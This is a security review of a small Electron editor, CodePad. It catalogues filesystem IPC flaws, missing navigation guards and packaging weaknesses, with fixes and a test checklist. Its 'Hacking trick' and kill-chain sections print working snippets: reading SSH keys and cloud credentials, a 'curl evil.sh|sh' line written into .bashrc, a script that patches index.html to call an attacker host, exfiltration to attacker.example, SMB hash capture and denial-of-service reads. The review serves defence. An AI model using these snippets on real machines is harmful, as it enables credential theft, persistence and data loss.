# CodePad — Security Review, Weaknesses & Attack Playbook

**Target:** CodePad 1.0.0 (Electron 33.x + Monaco 0.52.2)
**Scope:** `main.js`, `preload.js`, `renderer/index.html`, `renderer/app.js`, `package.json` build config
**Review type:** White-box source review + architecture/threat-model analysis (static; no live binary provided)
**Date:** 2026-10-26

---

## 0. TL;DR for the impatient

CodePad renders files as **text**, so opening a malicious source file does *not* execute it. That part is genuinely well built.

The problem is the **other direction**: the app ships a *general-purpose, unrestricted filesystem API* (`readFile` / `writeFile` / `readDir` on **any absolute path**) across the IPC bridge, exposes it to a production DevTools console, has **no navigation guards**, and installs its own source code as **plain, writable JavaScript on disk** (`asar: false`).

Result: anything that reaches the renderer's JS context gets **read-any-file + write-any-file**, which converts directly into **persistent code execution** because the app's own `index.html` / `preload.js` / `main.js` / `loader.js` are writable files that the CSP explicitly trusts.

| # | Severity | Finding | One-line impact |
|---|---|---|---|
| CP-01 | **Critical** | Unrestricted `fs:read` / `fs:write` / `fs:readDir` IPC — no path allowlist | Arbitrary file read/write as the user → data theft + RCE |
| CP-02 | **High** | No `will-navigate` / `setWindowOpenHandler` guards | Remote page inherits the `window.codepad` bridge → remote arbitrary FS access |
| CP-03 | **High** | DevTools shipped enabled in production | Turns CP-01 into a zero-effort, no-exploit file exfil tool |
| CP-04 | **High** | `sandbox: false` (unnecessary) | Preload has full Node `require`; removes a defence layer |
| CP-05 | **Medium-High** | Weak CSP (`'unsafe-inline'`, no `base-uri`, meta-only) | Any HTML injection → script execution with the bridge |
| CP-06 | **Medium** | Unbounded read; device files / pipes / TOCTOU | App freeze, OOM kill, 100% CPU |
| CP-07 | **Medium** | UNC paths accepted | NetNTLM hash leak to attacker-controlled SMB (Windows) |
| CP-08 | **Medium** | Zero IPC sender/frame validation | Any frame/injected script can use the whole FS API |
| CP-09 | **Medium** | `app:closeApproved` is fire-and-forget + latches | Bypass unsaved-changes prompt → silent data loss |
| CP-10 | **Medium** | Symlink/junction following in tree + no canonicalisation | Escape "project root", symlink loops, duplicate-tab clobbering |
| CP-11 | **Medium** | Unsigned builds + user-writable app dir + `asar:false` | Trivial local trojanisation, no tamper detection |
| CP-12 | Low | `innerHTML` sink in tab renderer | Currently static; one refactor away from DOM XSS |
| CP-13 | Low | `menuActions[action]` prototype-chain lookup | `__proto__` / `constructor` reachable via IPC string |
| CP-14 | Low | No permission handler, no `will-attach-webview` | Future-feature foot-gun |
| CP-15 | Low | 8 KB binary sniff, hardcoded UTF-8 | Binary junk in editor; misleading "UTF-8" badge |
| CP-16 | Low | Monaco worker script built by string interpolation | Install-path → JS injection into `data:` worker |
| CP-17 | Low | Non-atomic `writeFile` (truncate-then-write) | File corruption on crash/power loss |

---

## 1. Architecture & Trust Boundaries

```
┌──────────────────────────── MAIN PROCESS (full Node, full disk) ────────────────────────────┐
│  main.js                                                                                    │
│   • BrowserWindow { contextIsolation:true, nodeIntegration:false, sandbox:FALSE }           │
│   • ipcMain.handle('fs:read'|'fs:write'|'fs:readDir'|'dialog:*')   ← NO path validation     │
│   • Menu → send('menu', action) → renderer                                                  │
└───────────────────────────────────────────┬─────────────────────────────────────────────────┘
                                            │ IPC (contextBridge)
┌───────────────────────────────────────────▼─────────────────────────────────────────────────┐
│  PRELOAD (Node-capable because sandbox:false)                                               │
│   window.codepad = { readFile, writeFile, readDir, openFiles, saveAsDialog, approveClose … }│
└───────────────────────────────────────────┬─────────────────────────────────────────────────┘
                                            │
┌───────────────────────────────────────────▼─────────────────────────────────────────────────┐
│  RENDERER  file://…/renderer/index.html     CSP: script-src 'self' 'unsafe-inline'          │
│   app.js  → Monaco 0.52.2, tabs, tree, status bar                                           │
│   ★ Trust boundary collapses here: the bridge is a complete filesystem primitive ★           │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
```

**The core design flaw:** the security model *looks* correct (`contextIsolation: true`, `nodeIntegration: false`, a narrow-looking preload), but the *content* of the preload is a **fully generic filesystem driver**. `contextBridge` is only a boundary if what you bridge is not itself an escape hatch. Here, `window.codepad.readFile("/etc/shadow")` is equivalent to `require('fs').readFile("/etc/shadow")`.

Contrast with the correct pattern: the *renderer should never name a path*. It should pass **opaque tokens/indices** that the main process resolves against paths the **user already approved via a native dialog** (`dialog.showOpenDialog` / `showSaveDialog`). CodePad collects the dialog result in the renderer and then lets the renderer supply **arbitrary strings** for every subsequent `fs:*` call.

---

## 2. Findings in Detail

### CP-01 — Critical — Unrestricted filesystem IPC

**Location:** `main.js:148-167`, `preload.js:10-12`

```js
// main.js
ipcMain.handle('fs:read',  (_event, filePath) => readTextFile(filePath));
ipcMain.handle('fs:write', (_event, filePath, content) => fs.writeFile(filePath, content, 'utf8'));
ipcMain.handle('fs:readDir', async (_event, dirPath) => { … fs.readdir(dirPath, …) … });
```

```js
// preload.js
readFile:  (filePath) => ipcRenderer.invoke('fs:read', filePath),
writeFile: (filePath, content) => ipcRenderer.invoke('fs:write', filePath, content),
readDir:   (dirPath) => ipcRenderer.invoke('fs:readDir', dirPath),
```

**Description.** No path normalisation, no containment check, no allowlist, no extension filter, no "was this path approved by a dialog?" check. The only gate the user ever saw — the native file picker — is decorative, because the renderer can call the raw `fs:*` handlers with any string it likes.

**Why it's Critical (not just "arbitrary read").** Three mutually reinforcing facts:

1. **Read** gives credential theft: SSH keys, `%APPDATA%\…\Login Data` (browser password DB), `Cookies`, wallet `.dat` files, `.aws/credentials`, `.npmrc`, `.git-credentials`, `.env`, `id_rsa`, VPN configs, `/etc/shadow` on Linux with a permissive setup, `%APPDATA%\Microsoft\Credentials`.
2. **Write** gives persistence: any file the user can write, the app can write.
3. **`asar: false`** (`package.json:26`) means the application's own code is **plain, editable JavaScript** at `resources/app/…`, not a signed archive. Writing to `renderer/index.html` or `preload.js` = **code execution on next launch**, with no exploit chain required.

**Hacking trick — the DevTools one-liner (no exploit needed):**

```js
// Ctrl+Shift+I, console:
await codepad.readFile('C:/Users/victim/.ssh/id_rsa')          // private key
await codepad.readFile('C:/Users/victim/.aws/credentials')     // cloud creds
await codepad.readDir('C:/Users/victim/Documents')             // reconnaissance
await codepad.writeFile('C:/Users/victim/.bashrc', '\ncurl evil.sh|sh\n')
```

**Hacking trick — persistent RCE (2 steps, survives reboot):**

```js
// 1. Where is the app? (tree or readDir)
await codepad.readDir('C:/Users/victim/AppData/Local/Programs')

// 2. Patch the trusted HTML shell. CSP permits inline scripts ('unsafe-inline'),
//    so this executes on every launch with the full codepad bridge:
await codepad.writeFile(
  'C:/Users/victim/AppData/Local/Programs/CodePad/resources/app/renderer/index.html',
  (await codepad.readFile('C:/…/resources/app/renderer/index.html')).replace(
    '<head>',
    `<head><script>
       // exfiltrate + maintain
       fetch('https://attacker/c',{method:'POST',body:JSON.stringify({fs:1})}).catch(()=>{});
     </script>`
  )
)
```

Equivalent targets that are equally fatal because they are loaded with `script-src 'self'`:

* `resources/app/preload.js` → replace the bridge entirely.
* `resources/app/main.js` → the real jackpot: `require('child_process')` at startup.
* `resources/app/node_modules/monaco-editor/min/vs/loader.js` → loaded by `index.html:42` before anything else.
* `resources/app/renderer/app.js` → the app's own bootstrap.

**Remediation.**
1. **Never accept a path from the renderer.** Maintain a `Map<id, absolutePath>` in main, populated only by `showOpenDialog`/`showSaveDialog`/`readdir` results. The renderer passes an `id`.
2. If a path must cross the boundary (drag & drop), validate: `path.resolve`, reject UNC (`\\`), reject non-absolute, and require `realpath()` containment within an approved root.
3. Deny-list by policy: no `node_modules`, no app resources dir, no dotfiles outside the opened root.
4. Add a global write guard so the app can never overwrite its own installation directory.
5. Long-term: move file access into a `utilityProcess` with a reduced capability set.

---

### CP-02 — High — Missing navigation & window-open guards

**Location:** `main.js:72-101` (no `will-navigate`, no `setWindowOpenHandler`)

**Description.** Electron's *default* behaviour is to allow the window to navigate anywhere and to allow `window.open` to create a new `BrowserWindow` that **inherits the parent's `webPreferences`**, including the preload script. Because CodePad never installs:

```js
contents.on('will-navigate', e => e.preventDefault());
contents.setWindowOpenHandler(() => ({ action: 'deny' }));
```

…a single line of injected/console JS hands the **remote attacker's origin** a `window.codepad` object with full disk access.

**Hacking trick — bridge handoff + CSP-proof exfil:**

```js
// CSP has no navigate-to / no frame-src for popups; CSP cannot stop navigation.
const blob = await codepad.readFile('C:/Users/victim/.ssh/id_rsa');
const child = window.open('https://attacker.example/landing');   // inherits preload
// Child page then runs:  codepad.readDir('C:/')  →  full disk over HTTPS
```

Or the simpler "burn the tab" variant, which also **defeats the CSP** because CSP `default-src 'self'` does **not** restrict top-level navigation:

```js
location.href = 'https://attacker.example/?d=' + encodeURIComponent(btoa(await codepad.readFile('…')));
```

This is why CP-05's `connect-src` matters less than it appears: even a perfect CSP cannot stop `location =`. Only `will-navigate` can.

**Remediation.** As above, plus `webContents.on('will-redirect')`, `webContents.on('will-frame-navigate')`, and `app.on('web-contents-created')` to apply the guards to **all** contents (popups, workers, future webviews).

---

### CP-03 — High — DevTools enabled in production

**Location:** `main.js:65` — `{ role: 'toggleDevTools' }` in the View menu (default accelerator `Ctrl+Shift+I` / `Cmd+Opt+I`).

**Description.** There is no environment gate. Any person (or any UI-automation malware, RDP session, screen-share, or unattended kiosk) at the keyboard gets a **built-in REPL with the filesystem bridge**, bypassing every OS-level file-picker friction control. For a "text editor", that makes CodePad a **general-purpose arbitrary file read/write tool that is installed by default and looks benign**.

The console is also the delivery vehicle for every trick in this document.

**Remediation.**
```js
if (!process.env.CODEPAD_DEV) {
  webPreferences: { devTools: false }
}
```
and remove/guard the `toggleDevTools` menu role. Ship DevTools only in unpackaged runs (`!app.isPackaged`).

---

### CP-04 — High — `sandbox: false`

**Location:** `main.js:84`

**Description.** The preload uses only `contextBridge`, `ipcRenderer`, and `webUtils` — **all of which work in a sandboxed preload**. `sandbox: false` is unnecessary and buys the attacker a full Node environment inside the preload process: any single bug in the bridge (a leaked object, a getter that returns a `Buffer`, a future `ipcRenderer.invoke` passthrough) escalates from "renderer compromise" to "Node compromise" with `require('child_process')`.

Electron's recommended posture is `sandbox: true` + `contextIsolation: true` + `nodeIntegration: false`. CodePad has 2 of 3.

**Remediation.** Flip to `sandbox: true`; verify `webUtils.getPathForFile` still works on Electron 33 (it does — `webUtils` is exposed to sandboxed renderers). Also call `app.enableSandbox()` before `whenReady()`.

---

### CP-05 — Medium-High — Content Security Policy is weak for a file-privileged app

**Location:** `renderer/index.html:5-6`

```
default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
font-src 'self' data:; img-src 'self' data:; worker-src blob: data:
```

Problems:

| Issue | Consequence |
|---|---|
| `script-src 'unsafe-inline'` | Any HTML injection anywhere → immediate script execution. The app itself has **no inline scripts**, so this is pure downside. |
| No `base-uri` | `<base href="https://evil/">` would retarget the *relative* `<script src="app.js">` and `../node_modules/…/loader.js` to an attacker origin. |
| No `object-src 'none'` | Legacy `<object>`/plugin sinks. |
| No `form-action 'none'`, `frame-ancestors 'none'` | Form-based exfil; framing. |
| No `connect-src` (falls back to `default-src 'self'`) | Accidental, not deliberate; `fetch`/WebSocket policy should be explicit. |
| **Meta-tag delivery only** | Not applied by response headers; some subresource/worker contexts don't honour meta CSP; a future `loadURL` or `data:` document has no CSP at all. |
| `'self'` on `file://` | On `file:` origins `'self'` semantics are historically muddy in Chromium — do not rely on it to keep the renderer out of the rest of the disk. |

Combined with CP-12 (`innerHTML` habit) and the bridge, this is the "one injection away from Critical" layer.

**Remediation.**
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  font-src 'self' data:;
  img-src 'self' data:;
  worker-src 'self' blob:;
  connect-src 'none';
  base-uri 'none';
  form-action 'none';
  frame-ancestors 'none';
  object-src 'none'">
```
and additionally set it as a real header via `session.defaultSession.webRequest.onHeadersReceived` so it is enforced regardless of document type.

---

### CP-06 — Medium — Unbounded reads: device files, pipes, TOCTOU

**Location:** `main.js:103-114`

```js
const stat = await fs.stat(filePath);
if (stat.size > MAX_FILE_BYTES) return { tooLarge: true };
const buffer = await fs.readFile(filePath);   // ← no cap, relies on stat.size
```

**Description.** The 20 MB limit is enforced **before** the read, on a `stat` that is not binding. Three exploits:

1. **Device files / pseudo-files report `size: 0`:**
   * Linux/macOS: `codepad.readFile('/dev/zero')` → `fs.readFile` allocates until the **main process OOM-kills**. `'/dev/urandom'`, `'/proc/kcore'`, `'/proc/self/mem'` similar.
   * Windows: `codepad.readFile('\\\\.\\PhysicalDrive0')`, `'CON'`, `'NUL'`, `'COM1'` — or a **named pipe** `'\\.\pipe\somename'` which **blocks forever** (no writer) → the main process stops servicing IPC → the whole app hangs with "Not Responding".
2. **TOCTOU:** a file can be swapped/grown between `stat` and `readFile` (e.g. a log file being appended, or a symlink retargeted) → memory blow-up.
3. **Recursive/large dirs:** `fs:readDir` on `C:\Windows\WinSxS` or `/` builds the entire entry list synchronously in the main process.

**Hacking trick (denial of service, 1 line):**
```js
codepad.readFile('/dev/zero');            // Linux/macOS → main process OOM
codepad.readFile('\\\\.\\pipe\\nobody');  // Windows → permanent hang
```

**Remediation.** Stream with a hard byte cap and abort:
```js
const handle = await fs.open(filePath, 'r');
const { size, isFile, isFIFO, isCharacterDevice } = await handle.stat();
if (!isFile) { await handle.close(); return { unsupported: true }; }
if (size > MAX) { await handle.close(); return { tooLarge: true, size }; }
const chunks = []; let total = 0;
for await (const c of handle.createReadStream({ highWaterMark: 64 * 1024 })) {
  total += c.length;
  if (total > MAX) { await handle.close(); return { tooLarge: true }; }
  chunks.push(c);
}
```
Also reject `\\.\`, `\??\`, `CON`/`NUL`/`AUX`/`PRN`, `/dev/`, `/proc/`, and re-`stat` the open handle (not the path) to kill TOCTOU.

---

### CP-07 — Medium — UNC path handling → Windows credential leak

**Location:** `main.js:148-167` (any of `fs:read`, `fs:write`, `fs:readDir`)

**Description.** `filePath` is passed straight to `fs`. On Windows, a path beginning `\\attacker.tld\share\file` causes the **SMB client to authenticate to the attacker's server**, emitting the victim's **NetNTLMv2 hash** — crackable offline, or relayable. This works from `readDir` too, and from `write` (which will also write into a remote share if it exists).

Because there is no prefix filtering and no validation of the drag-and-drop source (`app.js:508-513` passes `api.pathForFile(file)` straight into `openPath`), a **planted shortcut/desktop.ini/`.lnk` or a social-engineered "drop this file" is enough**.

**Hacking trick.**
```js
codepad.readDir('\\\\192.0.2.10\\share');      // capture NetNTLMv2
codepad.readFile('\\\\192.0.2.10\\share\\a');   // same, on a worker thread
```

**Remediation.** Explicitly reject `path.sep + path.sep` prefixes and any path whose resolved form starts with `\\`; on Windows also reject extended-length prefixes (`\\?\`, `\\.\`, `\??\`). Prefer `path.isAbsolute() && !/^[\\/]{2}/.test(p)` as a cheap gate, plus an allowlist of roots.

---

### CP-08 — Medium — No IPC sender / frame validation

**Location:** `main.js:116-175` — every handler ignores `_event`.

**Description.** No handler checks `event.senderFrame.url`, `event.sender.getURL()`, or that the sender is the main frame of the main window. Consequences:

* Any **injected/embedded frame** (today: none; tomorrow: a preview pane, a Markdown renderer, an `<iframe>` for docs) immediately has the whole FS API.
* Any **child window** created by `window.open` (see CP-02) is a *different* `WebContents` — but since there is no sender check, it can call the same handlers.
* No rate-limiting → the bridge doubles as an unbounded filesystem crawler (`readDir` recursion over `C:\`) that can be used to fingerprint the machine.

**Remediation.**
```js
function guard(fn) {
  return async (event, ...args) => {
    const url = event.senderFrame?.url ?? '';
    if (url !== MAIN_URL) throw new Error('unauthorized');
    if (event.senderFrame !== event.sender.mainFrame) throw new Error('unauthorized');
    return fn(event, ...args);
  };
}
```

---

### CP-09 — Medium — Unsaved-changes guard is bypassable and *latches*

**Location:** `main.js:90-96`, `main.js:169-174`, `preload.js:14`, `app.js:302-309`

```js
ipcMain.on('app:closeApproved', () => { closeApproved = true; mainWindow.close(); });
```

Three defects:

1. **Any renderer code can call it at will** — `codepad.approveClose()` closes the window immediately, discarding every dirty buffer without a prompt. It is the *only* write-protection mechanism for unsaved work, and it is a public, unguarded, fire-and-forget message.
2. **`closeApproved` is never reset.** It is module-level and one-way. Any future "close" flow (e.g. reopen the window, `app.relaunch`) runs with the guard permanently disabled.
3. **Re-entrancy:** every `close` event re-sends `request-close` while the previous `confirmDiscard` modal may still be open → stacked dialogs / duplicate saves.

**Hacking trick (silent data destruction):**
```js
codepad.approveClose();   // all unsaved tabs gone, no prompt, no recovery file
```

**Remediation.** Make approval a **one-shot token**: main generates a nonce, includes it in `request-close`, the renderer returns it with a single-use `invoke`, main verifies and resets. Never expose a bare "approve" message.

---

### CP-10 — Medium — Symlinks / junctions / canonicalisation

**Location:** `main.js:154-167` (`readdir` + `withFileTypes`), `app.js:224-232` (`openPath` dedupe), `app.js:313-359` (tree)

**Description.**

* **Escape from the "project root":** `entry.isDirectory()` is used to decide whether a row expands. On Windows a **junction/symlink-to-directory** reports `isDirectory() === true` → clicking it invokes `readDir` on the *link target*, which can be `C:\Windows`, a network share, or the user's home. The "open folder" dialog is therefore not a containment boundary, which is the one thing users assume it is.
* **Symlink loop → UI lockup / unbounded DOM:** a directory containing `loop -> .` expands forever, appending infinite `<div>`s, until the renderer dies.
* **Duplicate-tab clobbering:** `openPath` dedupes by **raw string equality** (`tab.path === filePath`, `app.js:228`). `C:\x\a.js`, `c:\x\a.js`, `C:\x\.\a.js`, and `\\?\C:\x\a.js` are four different strings for **one file** → four tabs → last-save-wins → **silent data loss**. Same for case-insensitive HFS+/APFS and for symlinked paths.
* **Symlink write-through:** `fs.writeFile` follows symlinks; a swapped symlink between read and save writes into an unintended target (TOCTOU).

**Hacking trick.** Ship a "project" folder containing a junction named `assets` → `C:\Users\<victim>`. Victim opens the project, clicks `assets` → the sidebar is now the victim's home directory; then "open" `Documents` etc. Nice-looking, no exploit, no warning.

**Remediation.** Canonicalise every path with `fs.realpath()` (and `path.toLowerCase()` on Windows) before dedupe and before `readDir`; refuse to descend into a realpath outside the opened root; track an `inode`/`dev`+`ino` set to break loops; refuse write-through-symlink by `O_NOFOLLOW` (or `lstat` + compare inode) and prefer atomic `rename`.

---

### CP-11 — Medium — Installer / packaging integrity

**Location:** `package.json:23-50`

* **`asar: false`** — the app's JavaScript is plaintext and writable in the install directory. This is what upgrades CP-01 from "data theft" to "RCE + persistence". `asar` is *not* a security boundary either, but it removes trivial editing.
* **No code signing** (`win.certificateFile`, `mac.hardenedRuntime`, `notarize` are absent). Windows SmartScreen and macOS Gatekeeper cannot verify the binary; README even advertises "Unsigned builds may show an OS security warning on first launch" — training users to click through the exact warning that protects them.
* **`nsis.oneClick: false` + `allowToChangeInstallationDirectory`** — the default NSIS target for a non-admin build lands in `%LOCALAPPDATA%\Programs\CodePad`, which is **writable by any process running as that user**. Combined with `asar:false`, a low-privileged implant can rewrite `preload.js` and gain code execution the moment the user launches the editor. (A `Program Files` install raises this to admin-only.)
* **`portable` target** — a self-extracting exe in a user-writable folder has the same problem, and portable builds are the ones people copy to USB sticks and shares.
* **No updater** — good for attack surface, bad for patching: every vulnerability in this document has to be manually re-installed.

**Hacking trick — trojanising a distributed build.** Copy `CodePad.exe` + `resources/`, add 3 lines to `resources/app/preload.js` or `renderer/index.html`, re-zip, ship. No signature means no detection beyond heuristics.

**Remediation.** Enable signing + notarization; enable `asar` and serve Monaco workers from a custom protocol or a `file://`-safe worker URL (this is a real constraint — but it can be solved with `protocol.handle('app', …)` and `worker-src 'self'`, and moves you off `asar:false`); ship an ACL-hardened per-machine install (`perMachine: true`); document a checksum/verification path.

---

### CP-12 — Low — `innerHTML` in a privileged renderer

**Location:** `renderer/app.js:105`

```js
close.innerHTML = '<span>×</span>';
```

Today the value is a constant, so this is **not exploitable**. It is flagged because (a) `'unsafe-inline'` makes any future interpolation catastrophic rather than contained, and (b) it normalises a pattern in a file where the same style would be applied to `tab.name` / `entry.name` by the next contributor. The rest of the DOM writes are correctly `textContent` / `dataset` / `title` — credit where due.

**Fix:** `close.append(Object.assign(document.createElement('span'), { textContent: '×' }))`.

---

### CP-13 — Low — Prototype-chain lookup on an IPC-supplied string

**Location:** `renderer/app.js:435-456`, `app.js:499-504`

```js
api.onMenu((action) => { const handler = menuActions[action]; if (handler) handler(); });
```

`menuActions` is an object literal, so `action = "__proto__"` yields `Object.prototype` (truthy, **not a function**) → `TypeError` in the IPC callback. `action = "constructor"` → `Object` invoked with `this = undefined` → harmless. Not RCE, but it is an unvalidated channel from main→renderer into a **dictionary lookup**, and `menu` is a `send` with no schema.

**Fix:** `Object.create(null)` for `menuActions`, and `if (Object.hasOwn(menuActions, action))`.

---

### CP-14 — Low — Missing session/permission hardening

**Location:** `main.js:190-194`

Missing: `session.setPermissionRequestHandler`, `setPermissionCheckHandler`, `app.on('web-contents-created')`, `contents.on('will-attach-webview')`. Today no remote content or webview exists, so nothing is exploitable — but the default Electron permission machinery is more permissive than a text editor needs, and every one of these is a one-time, zero-cost guard.

**Fix:** deny-all permission handlers; `will-attach-webview` → `preventDefault()`.

---

### CP-15 — Low — Content sniffing and encoding

* `BINARY_SNIFF_BYTES = 8000` (`main.js:8`, `109-112`): a file whose first 8 KB are clean UTF-8 but which contains NULs later is loaded as text. Harmless-ish, but it defeats the "binary file" guard for crafted files.
* Encoding is hardcoded: `buffer.toString('utf8')` on read and `'utf8'` on write, while the status bar **always displays "UTF-8"** (`index.html:37`) regardless of truth. UTF-16/Latin-1 files are silently mojibake'd, and **saving then destroys the original bytes** (no BOM/encoding detection, no round-trip guarantee). That is a data-integrity bug with security relevance when editing configs/scripts.
* No newline-style preservation on read → a CRLF file opened and saved by a user who toggles EOL can be silently rewritten.

---

### CP-16 — Low — Install path interpolated into a `data:` worker script

**Location:** `renderer/app.js:10-16`

```js
getWorkerUrl: () => `data:text/javascript…${encodeURIComponent(
  `self.MonacoEnvironment={baseUrl:'${monacoBase}/'};` +
  `importScripts('${monacoBase}/vs/base/worker/workerMain.js');`
)}`
```

`monacoBase` comes from `window.location.href` and is inserted **inside single-quoted JS without escaping**. `encodeURIComponent` encodes URL syntax, **not JS syntax**. An install path containing `'` (e.g. `C:\Users\O'Brien\…`) breaks the worker; a crafted path can inject statements. This is a self-inflicted, local-only injection, but it is a genuine string→code sink.

**Fix:** `JSON.stringify(monacoBase)` instead of manual quotes, and build the worker from a Blob URL with an explicit CSP.

---

### CP-17 — Low — Non-atomic writes

**Location:** `main.js:150-152` → `fs.writeFile(filePath, content, 'utf8')`

Truncate-then-write. A crash, power loss, full disk, or ENOSPC in the middle leaves the user's file **empty or half-written** with no backup. For an editor, that is the worst possible failure mode, and it is trivially triggered by pointing `writeFile` at a large file on a full volume.

**Fix:** write to `filePath + '.tmp-<rand>'` in the same directory, `fsync`, then `rename()`; keep one `.bak`.

---

## 3. Kill Chains (how a real attacker strings this together)

### Chain A — "Open the console" (highest likelihood, 0 exploit skill)

```
unlocked/shared machine, RDP, screen-share, or UI-automation malware
  └─ Ctrl+Shift+I                          [CP-03]
      └─ codepad.readDir('C:/Users')       [CP-01]
          └─ readFile(.ssh/id_rsa, Login Data, .aws/credentials)
              └─ location = 'https://x/?d='+b64   [CP-02 — CSP cannot stop navigation]
                  └─ also: writeFile('…/resources/app/renderer/index.html', …)
                      └─ PERSISTENT RCE on next launch   [CP-01 + CP-11 asar:false]
```

### Chain B — "Malicious project folder" (social engineering, no user click on an exe)

```
Victim receives CodePad-project.zip containing:
  assets/  (Windows junction → C:\Users\victim)
  notes.md
  └─ Victim: File ▸ Open Folder ▸ unzip dir
      └─ clicks "assets"                   [CP-10 — junction followed]
          └─ sidebar = entire home directory (no warning, plausible UI)
              └─ opens .ssh/id_rsa in the pretty Monaco editor
                  └─ attacker's follow-up: "share your screen / export project"
```

### Chain C — "The editor that phones home"

```
Any renderer foothold (devtools, future Markdown preview, future plugin, XSS via CP-05)
  └─ window.open('https://attacker')        [CP-02 — inherits preload]
      └─ attacker page:  codepad.readDir('C:/'); codepad.readFile(…)
          └─ native HTTPS exfil, no CSP constraint (separate origin, own document)
              └─ codepad.writeFile(...app resources...) → persistence
```

### Chain D — "Freeze / crash for fun or to force a reboot-lose-unsaved-work"

```
codepad.readFile('/dev/zero')          → main process OOM            [CP-06]
codepad.readFile('\\\\.\\pipe\\x')     → main process hangs forever  [CP-06]
codepad.approveClose()                 → unsaved buffers destroyed   [CP-09]
```

### Chain E — "Credential capture over SMB"

```
codepad.readDir('\\\\attacker\\share')  → NetNTLMv2 hash             [CP-07]
  → crack offline / relay to SMB → domain foothold
```

---

## 4. What Actually Holds Up (don't regress these)

Worth stating plainly, so remediation doesn't over-correct:

* ✅ **File content is never executed.** Monaco renders text; there is no `eval`, no `new Function`, no `document.write`, no Markdown/HTML preview, no `<webview>`. Opening a malicious `.js`/`.html` is safe. **This is the single most important property of an editor, and it is correct.**
* ✅ `nodeIntegration: false` + `contextIsolation: true`.
* ✅ All user-controlled strings reach the DOM via `textContent` / `dataset` / `.title` / `.value` — **no filename-based DOM XSS**, including `renderDir` (`app.js:330-333`) and tab labels (`app.js:100-101`).
* ✅ The preload returns only **structured-clonable data** (no live Node objects, no `Buffer` leaks, no `require` passthrough) — a genuinely good `contextBridge` design.
* ✅ `MAX_FILE_BYTES` and a binary guard exist at all (rare in small editors).
* ✅ Dirty-buffer tracking via `getAlternativeVersionId()` is correct, including undo-back-to-saved.
* ✅ `requestSingleInstanceLock()` prevents multi-instance file races.
* ✅ No remote content loaded, no custom protocol handlers, no auto-updater attack surface.

---

## 5. Prioritised Remediation Plan

### P0 — do before any distribution (hours, not days)

| # | Change | File |
|---|---|---|
| 1 | Path-token allowlist: main owns the paths, renderer passes IDs | `main.js`, `preload.js` |
| 2 | `will-navigate` / `will-redirect` → `preventDefault()`; `setWindowOpenHandler` → deny; apply in `web-contents-created` | `main.js` |
| 3 | `devTools: false` when `app.isPackaged`; drop `toggleDevTools` | `main.js` |
| 4 | `sandbox: true` + `app.enableSandbox()` | `main.js` |
| 5 | IPC sender/frame validation wrapper | `main.js` |
| 6 | Reject UNC / device / pipe paths on all `fs:*` | `main.js` |

### P1 — next release

7. Tighten the CSP (`'unsafe-inline'` out, `base-uri`, `object-src`, `form-action`, `frame-ancestors`, `connect-src`) **and** set it as a response header.
8. Streaming read with a hard byte cap; `lstat` the **handle**, not the path.
9. One-shot close-approval nonce; reset on window recreate.
10. `realpath` canonicalisation + dedupe by inode; loop detection in the tree.
11. Atomic save (`tmp` + `fsync` + `rename` + `.bak`).
12. Deny-all permission handlers; `will-attach-webview` guard.

### P2 — packaging & hygiene

13. Code-sign + notarise; `perMachine` install (or explicit ACL note); consider `asar` + custom protocol for Monaco workers instead of `asar:false`.
14. Remove `innerHTML`; `Object.create(null)` for `menuActions`.
15. Encoding detection (BOM + UTF-16) and honest status-bar reporting; preserve EOL on save.
16. `JSON.stringify` the worker baseUrl; build it as a Blob.
17. Publish a security policy + checksums for releases; add a `SECURITY.md`.

---

## 6. Reference Patch Sketch (P0 items 1, 2, 4, 5, 6)

```js
// main.js — sketch, not drop-in
const { app, BrowserWindow, Menu, dialog, ipcMain, shell } = require('electron');
const fs = require('fs/promises');
const path = require('path');

const MAIN_URL = 'file://' + path.join(__dirname, 'renderer', 'index.html').replace(/\\/g, '/');
const approved = new Map();           // id -> real absolute path  (main-owned)
let nextHandle = 1;
const handleFor = (p) => { const id = nextHandle++; approved.set(id, p); return id; };

const isSafePath = (p) =>
  typeof p === 'string' &&
  path.isAbsolute(p) &&
  !/^[\\/]{2}/.test(p) &&                 // no UNC  (CP-07)
  !/^\\\\[.?]\\/.test(p) &&               // no \\.\ \??\  (CP-06)
  !/^\/(dev|proc|sys)\//.test(p);          // no device/pseudo fs (CP-06)

function onlyMain(event) {
  const f = event.senderFrame;
  if (!f || f !== event.sender.mainFrame || f.url.split('#')[0] !== MAIN_URL) {
    throw new Error('unauthorized IPC sender');
  }
}

function harden(contents) {
  contents.on('will-navigate', (e) => e.preventDefault());
  contents.on('will-redirect', (e) => e.preventDefault());
  contents.setWindowOpenHandler(() => ({ action: 'deny' }));
}
app.on('web-contents-created', (_e, contents) => harden(contents));
app.enableSandbox();

// renderer now speaks in handles, never paths
ipcMain.handle('fs:read',  async (e, id) => { onlyMain(e); const p = approved.get(id); if (!p) throw new Error('bad handle'); return readTextFile(p); });
ipcMain.handle('fs:write', async (e, id, s) => { onlyMain(e); const p = approved.get(id); if (!p || typeof s !== 'string') throw new Error('bad call'); return atomicWrite(p, s); });
ipcMain.handle('dialog:openFiles', async (e) => {
  onlyMain(e);
  const r = await dialog.showOpenDialog(mainWindow, { properties: ['openFile','multiSelections'] });
  return r.canceled ? [] : r.filePaths.filter(isSafePath).map(p => ({ id: handleFor(p), name: path.basename(p) }));
});
```

```js
// renderer/index.html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline';
  font-src 'self' data:; img-src 'self' data:; worker-src 'self' blob:;
  connect-src 'none'; base-uri 'none'; form-action 'none';
  frame-ancestors 'none'; object-src 'none'">
```

---

## 7. Verification Checklist (for the fix PR)

| Test | Expected after fix |
|---|---|
| DevTools console `codepad.readFile('C:/Windows/win.ini')` | throws `unauthorized` / no such API |
| `codepad.readFile(1)` with a forged handle | throws |
| `window.open('https://example.com')` | returns `null`, no window, no bridge |
| `location = 'https://example.com'` | blocked, page stays |
| `codepad.readFile('/dev/zero')` | rejected as unsupported device |
| `codepad.readDir('\\\\127.0.0.1\\share')` | rejected (UNC) |
| `codepad.approveClose()` | no-op without a matching nonce |
| Open folder, click a junction to `C:\Windows` | refused / not descendable |
| Two tabs for the same file via symlink | only one tab opened |
| `Ctrl+Shift+I` in a packaged build | nothing happens |
| Kill power mid-save | original file intact, `.bak` present |
| `getWorkerUrl()` with `O'Brien` install path | worker boots |

---

